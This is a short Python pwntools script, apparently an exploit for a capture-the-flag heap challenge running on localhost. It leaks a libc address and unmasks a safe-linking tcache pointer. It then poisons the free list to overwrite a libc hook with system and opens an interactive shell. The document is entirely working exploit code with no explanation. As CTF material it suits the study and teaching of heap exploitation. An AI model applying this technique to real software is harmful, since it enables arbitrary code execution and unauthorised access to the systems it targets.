from pwn import *

#io = gdb.debug("./test")
io = remote("localhost", 1447)

io.recvuntil(b"leak: ")

libc = ELF("./libc.so.6")
libc_leak = int(io.recvline(), 16)
libc_base = libc_leak - libc.symbols['_IO_2_1_stdin_']

system = libc.symbols['system']

malloc_offset = 6706960
#free_offset = 6450232
free_offset = 6708272

print(hex(libc_leak))

io.sendline(b'1')
io.sendline(b'/bin/sh')

io.sendline(b'1')
io.sendline(b'/bin/sh')

io.sendline(b'1')
io.sendline(b'/bin/sh')

io.sendline(b'2')
io.sendline(b'0')
io.sendline(b'0')

io.sendline(b'4')
io.sendline(b'0')

io.recvuntil(b"get? ")
current_ptr_masked = u64(io.recvline(keepends=False)+b'\x00\x00')

# unmask
val = current_ptr_masked
mask = 0xfff << 52
while mask:
    v = val & mask
    val ^= (v >> 12)
    mask >>= 12

mask = current_ptr_masked ^ val

io.sendline(b'3')
io.sendline(b'0')
io.sendline(p64((libc_base + free_offset - 16) ^ mask) + b'/bin/sh\x00'*1)

pause()

print(hex(libc_base + free_offset))

io.sendline(b'1')
print(p64(libc_base+system))
io.sendline(b'/bin/sh\x00'*2 + p64(libc_base + system))

io.interactive()




